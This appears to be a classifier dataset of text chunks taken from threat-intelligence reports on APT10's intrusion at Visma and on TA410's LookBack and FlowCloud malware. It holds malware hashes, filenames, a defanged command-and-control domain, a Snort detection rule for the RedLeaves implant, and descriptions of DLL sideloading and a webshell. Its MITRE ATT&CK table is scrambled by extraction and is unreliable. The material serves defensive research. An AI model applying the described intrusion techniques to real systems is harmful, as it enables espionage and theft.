vcruntime140.dll (Infection Chain 2)\nSHA256: ad116485f9184c85fd28331edae629c41fc39ec5123f41b15f6507b139a883c1 - unpack200.exe\nSHA256: C77535e19e5655f6ef72de3b2318e580095ca396c4383287cf8b5d4896235756 - gup.exe\nSHA256: Bfeb6efee4891de135431091079e659631376953a46065f7e44335df10d16425 - CASRTSP.exe (renamed from coInst.exe)\nSHA256: 5c5618e680bc45654dd55f161f195afbac98a7e111e4ef536ed811656582168d - MSVCR100.dll\nFilenames\nat.exe\nat.exe.cfg\nC.bat\nCU.EXE\nlg.exe\nps.exe\nr.exe\nat.exe\nCU.EXE\n1.bat\nat.exe.cfg\nC.bat.cfg\ndd.dmp\ndds.rar\nlg.exe\nlg.exe.cfg\nns.exe\nns.exe.cfg\npd.exe\nsam.save\nss.rar\nvcruntime140.dll\nversion.dll\nunpack200.exe\nCASTSP.exe\nRUTLFJPBTJSFZZAOJTYP\nCZYSOYKPOIKKZGUFOIUI\nLibcurl.dll\nMsvcr100.dll\nGup.exe\nCASRTSP.exe\nRecorded Future | www.recordedfuture.com",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.11183880269527435
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 28CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nAppendix B \u2014 Network Monitoring\nRedLeaves Snort Rules sourced from US-CERT alert TA17-117A\nalert tcp any any -> any any (msg: \u201cREDLEAVES Implant\u201d; content: \u201c|00 00 7a 8d 9b dc|\u201d; offset:\n2; depth: 6; content: \u201c|00 00|\u201d; offset: 10; depth: 2; sid:",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3884364068508148
        },
        "prediction": {}
    },
    {
        "text": "Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 31 Recorded Future | www.recordedfuture.com | CTA-2019-0206 | 32CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nMD5 8998D76981C6006B994D6C13D0781EDB\nSHA1 CE878FACCA3698A129E0633A93E8A9DC4105FE98\nSHA256 42b5eb1f77a25ad73202d3be14e1833ef0502b0b6ae7ab54f5d4b5c2283429c6\nimphash -\nCompilation Timestamp -\nType Binary Data\nSize 379KB\nFilename CZYSOYKPOIKKZGUFOIUI\nC2 www.miphomanager[.]com\nDescription DES-encrypted Trochilus executable.\n Infection Chain 2\nMD5 bbd3c23b9f3451b2c96df24441c76359\nSHA1 781069228a9271531cc3fe6b1ba7a5f75db486b6\nSHA256 fc6a130504b54fa72cfc104c656fe2cd92d7998f42ca064e22167e1d402a1514\nimphash 926ac3b9e79042520b69075417a4c157\nCompilation Timestamp 2018-05-04 07:11:30\nType Win32 EXE;\nPE32 executable for MS Windows (GUI) Intel 80386 32-bit\nSize 29.35KB\nFilename TailoredDeploy.Host.exe renamed to CASTSP.exe\nC2 -\nDescription Legitimate Microsoft Visual Studio 6.0 binary.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.08358985185623169
        },
        "prediction": {}
    },
    {
        "text": "When executed on host device,\nsideloads colocated malicious DLL to kickstart injection of malicious payload\ninto system processes.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4686501920223236
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 32CYBER THREAT ANALYSIS\nMD5 e4c0adce9258da655bef089ab0b697b0\nSHA1 85377f8815f433a3f2a2028ba3d6d2a908b400a4\nSHA256 eed0c7f7d36e75382c83e945a8b00abf01d3762b973c952dec05ceccb34b487d\nimphash c326c208bc65e6309413d8e699062a39\nCompilation Timestamp 2018-09-06 02:43:53\nType Win32 DLL; PE32 executable for MS Windows (DLL) (GUI) Intel 80386 32-bit\nSize 99.5KB\nFilename vcruntime140.dll\nC2 -\nDescription Malicious DLL, sideloaded using legitimate binary to decrypt, decompress, and\ninject DES-encrypted malicious Trochilus payload into memory.\n MD5 C43F640BBB78CE5032ED15AFB3A9B868\nSHA1 B5DD2DFE09A18E5E97FE0E3D0F8002882C8D056F\nSHA256 E6280de09f9adf79212409529eb25c0c2ea73e33a50281e22228a3db3998eecb\nimphash -\nCompilation Timestamp -\nType Binary Data\nSize 384KB\nFilename RUTLFJPBTJSFZZAOJTYP\nC2 www.miphomanager[.]com\nDescription DES-encrypted Trochilus executable.\n Webshell\nMD5 ee6a293893724c8d719ca00aa45d72d6\nSHA1 0c44c5c7cfa9f8e90fd851a68f343f0143a6896e\nSHA256 243d47fc2a24b391e1153d5c7807c6e5de51aba65fc79465d7b3e5c64d5fac41\nimphash -\nCompilation Timestamp -\nType ASCII text\nSize 77 bytes\nFilename iisstart.aspx\nC2 -\nDescription Server-side component of China Chopper ASPX payload.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.16655629873275757
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 34CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nAppendix E \u2014 MITRE ATT&CK Mapping\nThe MITRE ATT&CK grid populated below identifies the techniques\nutilized by APT10 attackers in the targeting outlined in this research.\n  MITRE ATT&CK Mapping\nInitial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command And Control\nDrive-by Compromise CMSTP Accessibility Features Access Token Manipulation Access Token Manipulation Account Manipulation Account Discovery A Sop fp twlic aa rt eion Deployment Audio Capture Automated Exfiltration Commonly Used Port\nE Ax pp pl lo icit a tP iou nblic-Facing Command-Line Interface Account Manipulation Accessibility Features Binary Padding Brute Force Application Window Discovery D",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.39117008447647095
        },
        "prediction": {}
    },
    {
        "text": "eri cb tu Mte od d eC lomponent Automated Collection Data Compressed C Reo mm om vu an bi lc ea Mtio en d iT ahrough\nHardware Additions Compiled HTML File",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6175627708435059
        },
        "prediction": {}
    },
    {
        "text": "AppCert DLLs AppCert DLLs BITS Jobs Credential Dumping Browser Bookmark Discovery E Sexp rvlo ici eta stion of Remote Clipboard Data Data Encrypted Connection Proxy\nR Re ep mli oc va ati bo ln e T Mh er do iu agh Control Panel Items AppInit DLLs AppInit DLLs Bypass User Account Control Credentials in Files File and Directory Discovery Log-on Scripts D Rea pta o sfr ito om ri eIn sformation Data Transfer Size Limits C Cu onst to rom l PC ro om tom coa lnd and\nSpearphishing Attachment Dynamic Data Exchange Application Shimming Application Shimming CMSTP Credentials in Registry Network Service Scanning Pass the Hash Data from Local System E Ax ltfi el rt nra at ti io vn e PO rv oe tr o col C Pru os tt oo cm o lCryptographic\nSpearphishing Link Execution through API Authentication Package Bypass User Account Control Code Signing E Cx rep dlo eit na tt iaio l n A cfo cer s s Network Share Discovery Pass the Ticket D Sha ata re f dro Dm r iN veetwork E anxfi dl t Cra ot",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2776825428009033
        },
        "prediction": {}
    },
    {
        "text": "Cv he ar nC no em lmand Data Encoding\nSpearphishing via Service E Mx oe dc uu lt eio",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6226264238357544
        },
        "prediction": {}
    },
    {
        "text": "Ln o t ah drough BITS Jobs DLL Search Order Hijacking Compiled HTML File Forced Authentication Network Sniffing Remote Desktop Protocol Data from Removable Media E Nx efi tl wtr oa rt kio Mn eO dv ie ur m Other Data Obfuscation\nSupply Chain Compromise E Ex xp eclo ui tt ia ot nion for Client Bootkit Exploitation for Privilege Component Firmware Hooking Password Policy Discovery Remote File Copy Data Staged E Px hfi yl st ir ca at li o",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3988098204135895
        },
        "prediction": {}
    },
    {
        "text": "O dv iue mr Domain Fronting\nTrusted Relationship Graphical User Interface Browser Extensions E Ms ec mala ot ri yo n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6859270930290222
        },
        "prediction": {}
    },
    {
        "text": "ct tr ia o nWindow C Ho ijam cp kio nn gent Object Model Input Capture Peripheral Device Discovery Remote Services Email Collection Scheduled Transfer Fallback Channels\nValid Accounts InstallUtil C Fih lea n Ag sse o D cie af ta iou nlt F Pi ele r mSy iss st ie om ns Weakness Control Panel Items Kerberoasting Permission Groups Discovery R Re ep mli oc va ati bo ln e",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.46149441599845886
        },
        "prediction": {}
    },
    {
        "text": "Proxy\nLSASS Driver Component Firmware Hooking DCShadow LLMNR/NBT-NS Poisoning Process Discovery Shared Webroot Man in the Browser Multi-Stage Channels\nMshta C Mo om dep",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5445899963378906
        },
        "prediction": {}
    },
    {
        "text": "lo Hn ie jan ct k O inb gject Image File Execution D ore Io nb fofu rs mc aa tt ie o/ nDecode Files Network Sniffing Query Registry Taint Shared Content Screen Capture Multiband Communication\nPowerShell Create Account Options Injection Disabling Security Tools Password Filter DLL Remote System Discovery Third-party Software Video Capture Multilayer Encryption\nRegsvcs/Regasm DLL Search Order Hijacking New Service DLL Search Order Hijacking Private Keys Security Software Discovery Windows Admin Shares Remote Access Tools\nRegsvr32 External Remote Services Path Interception DLL Side-Loading T Inw teo r- cF ea pct to ior n Authentication System Information Discovery W Main nd ao gw ems R ee nm tote Remote File Copy\nRundll32 F Wil ee a S ky ns ete ssm Permissions Port Monitors E Dx ep felo nit",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.2926938831806183
        },
        "prediction": {}
    },
    {
        "text": "Cy os nt fie gm u rN ae tit ow no Drk i s covery S Lata yn ed r a Pr rd o tA op cp ol lication\nScheduled Task Hidden Files and Directories Process Injection E Mx etr ma o W ryin Ind jo ew ct i on S Cy",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5821605324745178
        },
        "prediction": {}
    },
    {
        "text": "In yellow are the techniques that were observed during this\ncampaign and had previously been associated with APT10.\n In blue are techniques used by APT10 in previous campaigns that\nweren\u2019t observed in this campaign.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6386159062385559
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 34CYBER THREAT ANALYSIS\nAppendix F \u2014 Visma Statement\nHow Visma Managed the Case\nAll timelines and methods are documented in this report from\nRecorded Future and Rapid7.\n Visma\u2019s intelligence systems gave them warning about the theft\n(a threat hunter from Rapid7 used the Visma Global Responsible\nDisclosure Policy). Visma correlated the intelligence from Rapid7\nagainst their internal alerts and mitigated the threat.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5484123229980469
        },
        "prediction": {}
    },
    {
        "text": "The Visma Corporate Security Incident Response Team (Visma\nCSIRT) worked closely with their Product Security Operations Center\n(PSOC), NSM NorCERT, as well as the police.\n After initial attribution (using data from Recorded Future, among\nother systems), Visma decided to contract an external partner\n(Recorded Future) to dig deeper into the incident report and gather\nadditional intelligence in order to ensure proper attribution to\nbetter understand this threat actor.\n In this case, no client data was compromised, and Visma chose not\nto issue a general alert before they had conclusive evidence on who\nperformed the theft.\n They assisted NSM NorCERT and others in the investigation and\ngeneral cleanup of this case.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4051702618598938
        },
        "prediction": {}
    },
    {
        "text": "| CTA-2019-0206 | 36CYBER THREAT ANALYSIS CYBER THREAT ANALYSIS\nRetrospective\nVisma does not see any reason to question Recorded Future or\nRapid7\u2019s attribution in this case, but Visma wants to give a general\nwarning about general nation-state-backed advanced persistent\nthreat actors that seem to target businesses and governments alike\nwith their advanced attack methods.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.47281262278556824
        },
        "prediction": {}
    },
    {
        "text": "From Visma\u2019s experience and data, it can be observed that\nmost threat actors seem to have their own methods, tools, and\nplaybooks that may be used to identify them when carrying out a\ndecent analysis of their actions. Their motivation for these actions\nis sometimes quite tricky to understand, but most can probably\nbe classified as espionage, preparations for later hybrid warfare\noperations, or similar.\n ",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.4708279073238373
        },
        "prediction": {}
    },
    {
        "text": "Visma sees evidence of similar attempts against their systems quite\noften, but since this one was successful in stealing something and\nwas quite advanced, they want to put out a warning about this\nparticular threat actor.\n  They are thankful for the guidance and advice from NSM NorCERT,\npolice, and other cooperating parties in this case and urge all\nbusiness entities to explore the opportunities that are available in\nCERT cooperation.\n  Visma has transparency as a carrying principle for their business\nand will publish data on nation-state and criminal attacks against\nthem both now and in the future.",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": false,
            "confidence": 0.3716859221458435
        },
        "prediction": {}
    },
    {
        "text": "They will share information to\nensure public awareness of these matters and to motivate others\nto do the same.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.6750137805938721
        },
        "prediction": {}
    },
    {
        "text": "About Recorded Future\nRecorded Future arms security teams with the only complete threat intelligence\nsolution powered by patented machine learning to lower risk. Our technology\nautomatically collects and analyzes information from an unrivaled breadth of\nsources and provides invaluable context in real time and packaged for human\nanalysis or integration with security technologies.\n",
        "source": "cta-2019-0206.pdf",
        "detection": {
            "response": true,
            "confidence": 0.5373674631118774
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTA410: Malware Attacks Against U.S. Utilities Sector | Proofpoint US\n\n\n\n\n\n\n\n\n\n      Skip to main content\n    \n\n\n\n \nProducts\nSolutions\nPartners\nResources\nCompany\nContactLanguages\nSupport Log-in\nDigital Risk Portal\nEmail Fraud Defense\nET Intelligence\nProofpoint Essentials\nSendmail Support Log-in\n\n Main Menu \n\nAegis Threat Protection PlatformDisarm BEC, phishing, ransomware, supply chain threats and more.\n Sigma Information Protection PlatformDefend your data from careless, compromised and malicious users.\n Identity Threat Defense PlatformPrevent identity risks, detect lateral movement and remediate identity threats in real time.\n Intelligent Compliance PlatformReduce risk, control costs and improve data visibility to ensure compliance.\n Premium ServicesLeverage proactive expertise, operational continuity and deeper insights from our skilled experts.\n\n\n\n\n   New threat protection solution bundles with flexible deployment options \n  AI-powered protection against BEC, ransomware, phishing, supplier risk\u00a0and\u00a0more with inline+API or MX-based deployment\nLearn More\n\n\nSolutions by Topic\n\n\nCombat Email and Cloud ThreatsProtect your people from email and cloud threats with an intelligent and holistic approach.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.13108253479003906
        },
        "prediction": {}
    },
    {
        "text": "Change User BehaviorHelp your employees identify, resist and report attacks before the damage is done.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6681568622589111
        },
        "prediction": {}
    },
    {
        "text": "Combat Data Loss and Insider RiskPrevent data loss via negligent, compromised and malicious insiders by correlating content, behavior and threats.\n Modernize Compliance and ArchivingManage risk and data retention needs with a modern compliance and archiving solution.\n Protect Cloud AppsKeep your people and their cloud apps secure by eliminating threats, avoiding data loss and mitigating compliance risk.\n\n\n Prevent Loss from RansomwareLearn about this growing threat and stop attacks by securing today\u2019s top ransomware vector: email.\n Secure Microsoft 365Implement the very best security and compliance solution for your Microsoft 365 collaboration suite.\n Defend Your Remote Workforce with Cloud EdgeSecure access to corporate resources and ensure business continuity for your remote workers.\n Authenticate Your EmailProtect your email deliverability with DMARC.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.19646579027175903
        },
        "prediction": {}
    },
    {
        "text": "Solutions by Industry\n\nFederal Government\nState and Local Government\nHigher Education\nFinancial Services\nHealthcare\nMobile Operators\nInternet Service Providers\nSmall and Medium Businesses\n\n\nPartner Programs\n\n\nChannel PartnersBecome a channel partner.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4858477711677551
        },
        "prediction": {}
    },
    {
        "text": "Archive Extraction PartnersLearn about Proofpoint Extraction Partners.\n Global System Integrator (GSI) and Managed Service Provider (MSP) PartnersLearn about our global consulting and services partners that deliver fully managed and integrated solutions.\n\n\n Technology and Alliance PartnersLearn about our relationships with industry-leading firms to help protect your people, data and brand.\n Social Media Protection PartnersLearn about the technology and alliance partners in our Social Media Protection Partner program.\n Proofpoint Essentials Partner ProgramsSmall Business Solutions for channel partners and MSPs.\n\n\n\n Partner Tools\n\nBecome a Channel Partner\nChannel Partner Portal\n\n\n\n\nResource LibraryFind the information",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4654448926448822
        },
        "prediction": {}
    },
    {
        "text": "BlogKeep up with the latest news and happenings in the ever\u2011evolving cybersecurity landscape.\n PodcastsLearn about the human side of cybersecurity.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6517619490623474
        },
        "prediction": {}
    },
    {
        "text": "New Perimeters MagazineGet the latest cybersecurity insights in your hands \u2013 featuring valuable knowledge from our own industry experts.\n\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6994525194168091
        },
        "prediction": {}
    },
    {
        "text": "Threat GlossaryLearn about the latest security threats and how to protect your people, data, and brand.\n EventsConnect with us at events to learn how to protect your people and data from ever\u2011evolving threats.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.607037365436554
        },
        "prediction": {}
    },
    {
        "text": "WebinarsBrowse our webinar library to learn about the latest threats, trends and issues in cybersecurity.\n Watch now to earn your CPE credits\n\n\n\nSecurity Hubs\n\nGet free research and resources to help you protect against threats, build a security culture, and stop ransomware in its tracks.\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5773449540138245
        },
        "prediction": {}
    },
    {
        "text": "Threat Hub\nCISO Hub\nCybersecurity Awareness Hub\nRansomware Hub\nInsider Threat Management Hub\n\n\n\n\n\nAbout ProofpointProofpoint is a leading cybersecurity company that protects organizations' greatest assets and biggest risks: their people.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5571930408477783
        },
        "prediction": {}
    },
    {
        "text": "Learn about our unique people-centric approach to protection.\n CareersStand out and make a difference at one of the world's leading cybersecurity companies.\n\n\n News CenterRead the latest press releases, news stories and media highlights about Proofpoint.\n Privacy and TrustLearn about how we handle data and make commitments to privacy and other regulations.\n Environmental, Social, and GovernanceLearn about our people-centric principles and how we implement them to positively impact our global community.\n\n\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.42273300886154175
        },
        "prediction": {}
    },
    {
        "text": "Sigma Information Protection PlatformDefend your data from careless, compromised and malicious users.\n  Identity Threat Defense PlatformPrevent identity risks, detect lateral movement and remediate identity threats in real time.\n  Intelligent Compliance PlatformReduce risk, control costs and improve data visibility to ensure compliance.\n ",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.41756385564804077
        },
        "prediction": {}
    },
    {
        "text": "Overview\nEmail Security and Protection\nEmail Protection\nEmail Fraud Defense\nSecure Email Relay\nThreat Response Auto-Pull\nSendmail Open Source\nEssentials for Small Business\n\nAdvanced Threat Protection\nTargeted Attack Protection in Email\nThreat Response\nEmerging Threats Intelligence\n\nSecurity Awareness Training\nAssess\nChange Behavior\nEvaluate\n\nOverview\nInformation Protection\nEnterprise Data Loss Prevention (DLP)\nInsider Threat Management\nIntelligent Classification and Protection\nEndpoint Data Loss Prevention (DLP)\nEmail Data Loss Prevention (DLP)\nEmail Encryption\nData Discover\n\nCloud Security\nIsolation\nCloud App Security Broker\nWeb Security\n\nOverview\nIdentity Threat Detection and Response\nSpotlight\nShadow\n\nOverview\nCompliance and Archiving\nAutomate\nCapture\nPatrol\nTrack\nArchive\nDiscover\nSupervision\n\nOverview\nPremium Services\nManaged Email Threat Protection\nManaged Information Protection\nManaged Security Awareness\nManaged Abuse Mailbox\nRecurring Consultative Services\nTechnical Account Managers\nThreat Intelligence Services\nPeople-Centric Security Program\n\n\n\n\n\n\n  New threat protection solution bundles with flexible deployment options \n  AI-powered protection against BEC, ransomware, phishing, supplier risk\u00a0and\u00a0more with inline+API or MX-based deployment\nLearn More\n\n\n\n\n\n\nSolutions by Topic\n\n\nCombat Email and Cloud ThreatsProtect your people from email and cloud threats with an intelligent and holistic approach.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.16530004143714905
        },
        "prediction": {}
    },
    {
        "text": "Change User BehaviorHelp your employees identify, resist and report attacks before the damage is done.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6681568622589111
        },
        "prediction": {}
    },
    {
        "text": "Combat Data Loss and Insider RiskPrevent data loss via negligent, compromised and malicious insiders by correlating content, behavior and threats.\n Modernize Compliance and ArchivingManage risk and data retention needs with a modern compliance and archiving solution.\n Protect Cloud AppsKeep your people and their cloud apps secure by eliminating threats, avoiding data loss and mitigating compliance risk.\n\n\n Prevent Loss from RansomwareLearn about this growing threat and stop attacks by securing today\u2019s top ransomware vector: email.\n Secure Microsoft 365Implement the very best security and compliance solution for your Microsoft 365 collaboration suite.\n Defend Your Remote Workforce with Cloud EdgeSecure access to corporate resources and ensure business continuity for your remote workers.\n Authenticate Your EmailProtect your email deliverability with DMARC.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.19646579027175903
        },
        "prediction": {}
    },
    {
        "text": "Solutions by Industry\n\nFederal Government\nState and Local Government\nHigher Education\nFinancial Services\nHealthcare\nMobile Operators\nInternet Service Providers\nSmall and Medium Businesses\n\n\n\n\n\n\nPartner Programs\n\n\nChannel PartnersBecome a channel partner.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4858477711677551
        },
        "prediction": {}
    },
    {
        "text": "Archive Extraction PartnersLearn about Proofpoint Extraction Partners.\n Global System Integrator (GSI) and Managed Service Provider (MSP) PartnersLearn about our global consulting and services partners that deliver fully managed and integrated solutions.\n\n\n Technology and Alliance PartnersLearn about our relationships with industry-leading firms to help protect your people, data and brand.\n Social Media Protection PartnersLearn about the technology and alliance partners in our Social Media Protection Partner program.\n Proofpoint Essentials Partner ProgramsSmall Business Solutions for channel partners and MSPs.\n\n\n\n\n Partner Tools\n\nBecome a Channel Partner\nChannel Partner Portal\n\n\n\n\n\n\n\n\n\nResource LibraryFind the information",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4654448926448822
        },
        "prediction": {}
    },
    {
        "text": "BlogKeep up with the latest news and happenings in the ever\u2011evolving cybersecurity landscape.\n PodcastsLearn about the human side of cybersecurity.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6517619490623474
        },
        "prediction": {}
    },
    {
        "text": "New Perimeters MagazineGet the latest cybersecurity insights in your hands \u2013 featuring valuable knowledge from our own industry experts.\n\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6994525194168091
        },
        "prediction": {}
    },
    {
        "text": "Threat GlossaryLearn about the latest security threats and how to protect your people, data, and brand.\n EventsConnect with us at events to learn how to protect your people and data from ever\u2011evolving threats.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.607037365436554
        },
        "prediction": {}
    },
    {
        "text": "WebinarsBrowse our webinar library to learn about the latest threats, trends and issues in cybersecurity.\n Watch now to earn your CPE credits\n\n\n\n\nSecurity Hubs\n\nGet free research and resources to help you protect against threats, build a security culture, and stop ransomware in its tracks.\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5773449540138245
        },
        "prediction": {}
    },
    {
        "text": "Threat Hub\nCISO Hub\nCybersecurity Awareness Hub\nRansomware Hub\nInsider Threat Management Hub\n\n\n\n\n\n\n\n\n\nAbout ProofpointProofpoint is a leading cybersecurity company that protects organizations' greatest assets and biggest risks: their people.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5571930408477783
        },
        "prediction": {}
    },
    {
        "text": "Learn about our unique people-centric approach to protection.\n CareersStand out and make a difference at one of the world's leading cybersecurity companies.\n\n\n News CenterRead the latest press releases, news stories and media highlights about Proofpoint.\n Privacy and TrustLearn about how we handle data and make commitments to privacy and other regulations.\n Environmental, Social, and GovernanceLearn about our people-centric principles and how we implement them to positively impact our global community.\n\n\n\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.42273300886154175
        },
        "prediction": {}
    },
    {
        "text": "Support\n\nAccess the full range of Proofpoint support services.\n Learn More\n\n\n\n\n\nContinua a vedere i contenuti per la tua posizioneUnited StatesUnited KingdomFranceDeutschlandEspa\u00f1a\u65e5\u672cAustraliaItaliaContinua\n\n\n\n\n\n \n\n\n\n\nBlogThreat Insight\n                                    TA410: The Group Behind LookBack Attacks Against U.S. Utilities Sector Returns with New Malware\n                              \n\n \n\n\n\n\n\n\n\n\n\n\n\n\nTA410: The Group Behind LookBack Attacks Against U.S. Utilities Sector Returns with New Malware\n\n\n\n\n\nShare with your network!\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  June 08, 2020\n\n\n                Michael Raggi, Dennis Schwarz, and Georgi Mladenov with the Proofpoint Threat Research Team\n  \n        \n\n  In August 2019, Proofpoint researchers reported that LookBack malware was targeting the United States (U.S.) utilities sector between July and August 2019. We then continued our analysis into additional LookBack campaigns that unfolded between August 21-29, 2019.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.2725240886211395
        },
        "prediction": {}
    },
    {
        "text": "These campaigns utilized malicious macro-laden documents in order to deliver modular malware to targeted utility providers across the U.S. At the same time as the LookBack campaigns, Proofpoint researchers identified a new, additional malware family named FlowCloud that was also being delivered to U.S. utilities providers.\n FlowCloud malware, like LookBack, gives attackers complete control over a compromised system. Its remote access trojan (RAT) functionality includes the ability to access installed applications, the keyboard, mouse, screen, files, services, and processes with the ability to exfiltrate information via command and control.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4832359254360199
        },
        "prediction": {}
    },
    {
        "text": "We analyzed phishing campaigns between July-November 2019 and have determined that both LookBack and FlowCloud malware can be attributed to a single threat actor we are calling TA410. This conclusion is based on the threat actor\u2019s use of shared attachment macros, malware installation techniques, and overlapping delivery infrastructure.\n In addition, our analysis found similarities between TA410 and TA429 (APT10) delivery tactics.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4652710556983948
        },
        "prediction": {}
    },
    {
        "text": "TA410 campaigns detected in November 2019 included TA429 (APT10)-related infrastructure used in phishing attachment delivery macros.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4891897737979889
        },
        "prediction": {}
    },
    {
        "text": "However, Proofpoint analysts believe that intentional reuse of well-publicized TA429 (APT10) techniques and infrastructure may be an attempt by threat actors to create a false flag. For this reason, while research is ongoing, we do not attribute LookBack and FlowCloud campaigns to TA429 (APT10). Proofpoint currently tracks TA429 (APT10) independently of TA410 campaigns.\n Figure 1 below shows a timeline of the identified LookBack and FlowCloud campaigns.\n\n Figure 1 LookBack and FlowCloud Campaign Timeline\nDelivery\nProofpoint researchers observed phishing campaigns beginning on July 10, 2019 that targeted utility providers across the United States with portable executable (PE) attachments and used subject lines such as \u201cPowerSafe energy educational courses (30-days trial)\u201d.\u00a0 ",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.2967830002307892
        },
        "prediction": {}
    },
    {
